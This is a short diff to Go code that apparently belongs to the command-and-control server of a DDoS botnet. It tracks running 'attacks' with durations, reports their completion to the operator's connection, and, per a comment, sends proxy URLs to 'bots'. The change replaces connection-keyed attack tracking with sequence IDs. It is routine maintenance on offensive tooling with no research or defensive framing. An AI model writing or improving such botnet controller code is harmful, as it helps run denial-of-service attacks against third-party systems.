@@ -398,16 +398,18 @@ func handleRequest(conn net.Conn) {
 						start:    time.Now(),
 					}
 					ongoingAttacksLock.Lock()
-					ongoingAttacks[conn] = a
+					ongoingAttackSeq++
+					atkID := ongoingAttackSeq
+					ongoingAttacks[atkID] = a
 					ongoingAttacksLock.Unlock()
 
-					go func(conn net.Conn, a attack) {
+					go func(id int, conn net.Conn, a attack) {
 						time.Sleep(a.duration)
 						ongoingAttacksLock.Lock()
-						delete(ongoingAttacks, conn)
+						delete(ongoingAttacks, id)
 						ongoingAttacksLock.Unlock()
 						conn.Write([]byte("\033[38;5;46m✓ Attack completed and removed.\033[0m\n"))
-					}(conn, a)
+					}(atkID, conn, a)
 
 					// Build command string - send proxy URL to bots (they fetch & rotate without validation)
 					if proxyMode && proxyURL != "" {
